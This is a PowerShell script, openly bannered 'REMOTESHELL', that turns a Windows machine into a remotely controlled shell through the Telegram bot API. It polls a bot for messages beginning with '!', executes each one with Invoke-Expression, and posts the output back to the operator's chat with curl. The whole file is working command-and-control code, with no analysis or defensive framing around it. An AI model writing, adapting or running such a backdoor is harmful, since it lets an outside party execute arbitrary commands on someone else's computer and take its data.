Start-Sleep -Milliseconds 400
$wshell = New-Object -ComObject WScript.Shell
$wshell.SendKeys("{F11}")
Start-Sleep -Milliseconds 200

Clear-Host
Write-Host '====================================================================================================================================' -ForegroundColor Green
Write-Host ''
Write-Host ' ______       ______       __    __       ______       ______       ______       ______       __  __       ______       __         __        ' -ForegroundColor Green
Write-Host '/\   == \     /\  ___\     /\ "-./  \     /\  __ \     /\__  _\     /\  ___\     /\  ___\     /\ \_\ \     /\  ___\     /\ \       /\ \       ' -ForegroundColor Green
Write-Host '\ \  __<     \ \  __\     \ \ \-./\ \    \ \ \/\ \    \/_/\ \/     \ \  __\     \ \___  \    \ \  __ \    \ \  __\     \ \ \____  \ \ \____  ' -ForegroundColor Green
Write-Host ' \ \_\ \_\    \ \_____\    \ \_\ \ \_\    \ \_____\     \ \_\      \ \_____\    /\_____\    \ \_\ \_\    \ \_____\    \ \_____\  \ \_____\ ' -ForegroundColor Green
Write-Host '  \/_/ /_/     \/_____/     \/_/  \/_/     \/_____/      \/_/      \/_____/    \/_____/     \/_/\/_/     \/_____/     \/_____/    \/_____/ ' -ForegroundColor Green
Write-Host ''
Write-Host '====================================================================================================================================' -ForegroundColor Green
Write-Host ''
Write-Host '[*] Status: Establishing Connection...' -ForegroundColor Yellow

$chatId =$null
while (-not $chatId) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -ErrorAction Stop
        if ($updates.ok -and$updates.result.Count -gt 0) {
            $chatId =$updates.result[-1].message.chat.id
        }
    } catch { }
    if (-not $chatId) { Start-Sleep 2 }
}

Write-Host "[+] Connection Established - Chat ID: $chatId" -ForegroundColor Green
Write-Host "[*] Awaiting remote commands..." -ForegroundColor DarkGray
Write-Host ""

$lastUpdateId = 0

while ($true) {
    Start-Sleep 3
    try {
        $response = & curl.exe -s "https://api.telegram.org/bot$Token/getUpdates?offset=$($lastUpdateId + 1)&timeout=1"
        $json =$response | ConvertFrom-Json
        
        if ($json.ok -and$json.result.Count -gt 0) {
            foreach ($update in$json.result) {
                $lastUpdateId =$update.update_id
                $msgText =$update.message.text
                
                if ($msgText -and$msgText.StartsWith('!')) {
                    $cmd =$msgText.Substring(1)
                    
                    # Command Execution Header Box
                    Write-Host "┌──([ REMOTE COMMAND ])────────────────────────────────────────────────────────" -ForegroundColor DarkCyan
                    Write-Host "├─ Command : $cmd" -ForegroundColor Cyan
                    Write-Host "└──────────────────────────────────────────────────────────────────────────────────" -ForegroundColor DarkCyan
                    
                    $output = ""
                    $outputColor = "White"
                    try {
                        $output = (Invoke-Expression$cmd 2>&1 | Out-String)
                    } catch {
                        $output =$_.Exception.Message
                        $outputColor = "Red"
                    }
                    if (-not $output.Trim()) {$output = "[Command executed with no return output]" }
                    
                    # Stylized Output Pane (Box-wrapped lines)
                    Write-Host "┌──[ Execution Output ]────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
                    foreach ($line in ($output.TrimEnd() -split "`n")) {
                        Write-Host "│ $line" -ForegroundColor $outputColor
                    }
                    Write-Host "└──────────────────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
                    Write-Host ""
                    
                    $encodedOut = [System.Web.HttpUtility]::UrlEncode("`n$output")
                    & curl.exe -s "https://api.telegram.org/bot$Token/sendMessage?chat_id=$chatId&text=$encodedOut" > $null
                }
            }
        }
    } catch { }
}
